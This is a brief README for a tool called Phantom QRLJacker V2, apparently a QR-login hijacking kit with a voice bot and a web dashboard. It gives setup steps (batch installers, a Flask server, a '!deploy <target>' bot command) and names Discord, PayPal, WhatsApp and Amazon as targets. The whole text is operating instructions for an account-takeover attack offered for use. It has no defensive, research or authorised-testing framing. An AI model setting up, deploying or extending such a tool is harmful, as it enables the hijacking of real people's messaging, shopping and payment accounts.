Phantom QRLJacker V2 - Full Voice Bot + Dashboard

Setup Instructions:
1. Run 'install.bat' (installs dependencies)
2. Run 'start.bat' (starts bot)
3. Run 'modules/flask_server.py' in another terminal to launch server
4. Use the dashboard or type !deploy <target> in the bot

Targets: discord, paypal, whatsapp, amazon
